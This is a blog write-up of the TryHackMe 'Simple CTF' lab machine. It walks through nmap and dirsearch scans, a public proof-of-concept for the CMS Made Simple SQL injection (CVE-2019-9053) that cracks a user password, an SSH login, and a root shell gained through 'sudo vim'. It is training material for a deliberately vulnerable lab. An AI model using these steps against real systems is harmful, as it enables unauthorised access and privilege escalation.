---
tagline: simplectf
title: Simple CTF | A Simple Writeup
description: A simple writeup for a simple machine.
banner: /blog/tryhackmeban2.png/
banner_alt: Banner of THM (if you find this the flag is csd{8r1N6_84CK_7H3_816_84N6_7H30rY})
date: '2024-02-19'
---
## Foreword

Keeping the intro concise, today I'll be tackling a THM machine created by [MrSeth6797](https://tryhackme.com/p/MrSeth6797). You can find this machine [here](https://tryhackme.com/room/easyctf).

## Question 1 & 2

- Starting with a NMAP scan

```bash:Terminal
❯ sudo nmap -sS -sV 10.10.221.233
Password:
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-18 22:46 EST
Nmap scan report for 10.10.221.233
Host is up (0.22s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.38 seconds
```

- To summarize, port 21 & 80 are open under port 1000 and ssh is running on the highest port.

## Dirsearch

```bash:Terminal
❯ dirsearch -u 10.10.221.233 --exclude-status 404,403

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /Users/vipin/reports/_10.10.221.233/_24-02-18_23-42-55.txt

Target: http://10.10.221.233/

[23:43:01] Starting:
[23:44:32] 200 -  540B  - /robots.txt
[23:44:35] 301 -  315B  - /simple  ->  http://10.10.221.233/simple/

Task Completed
```

- *robots.txt* shows nothing important but */simple* shows us some sort of homepage

## Question 3 & 4

- Towards the bottom, we see the site is powered by *cmsmadesimple*

![Image showing a potential vulnerability](/blog/simplectfpics/vulnerabilityclue1.png 'Fig.1')

- A simple search tells us that vulnerability is [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053) and it vulnerable to sqli.  

## Question 5

- Looking around the internet, we find [this POC script](https://github.com/Mahamedm/CVE-2019-9053-Exploit-Python-3) and the hint tells us to crack with [this](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best110.txt) wordlist.

```bash:Terminal
❯ python3 csm_made_simple_injection.py -u http://10.10.159.250/simple/ --crack -w /Users/vipin/tech/CTFs/wordlists/best110.txt

[+] Salt for password found: <REDACTED>
[+] Username found: mitch
[+] Email found: admin@adw
[+] Password found: <REDACTED>
[+] Password cracked: <REDACTED>
```

## Questions 6 to 10 + Final Thoughts

- Now we can login through SSH with the username & password

```bash:Terminal
❯ ssh mitch@10.10.159.250 -p 2222
mitch@10.10.159.250's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
<REDACTED>
```

- Looking in the home directory we find another user by the name of sunbath and running ```sudo -l``` we see that we can use vim to spawn a privileged shell (If you want to understand this better, check out [this](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d) article)

```bash:Terminal
❯ sudo vim 

:r!whoami # using ":r!" we can run commands as root

root # and look it tells us we are root
```

- Tiny issue with that, most commands can't work

```bash:Terminal
$ sudo vim -c '!bash'
root@Machine:/# cd /root
root@Machine:~# ls
root.txt
root@Machine:~# cat root.txt
<REDACTED>
root@Machine:~#
```

"Voila! Another machine rooted! I had a blast and learnt some new things along the way. I hope you enjoyed this writeup. If you're hungry for more, feel free to check out other writeups [here](https://www.vipinb.xyz/blog)!
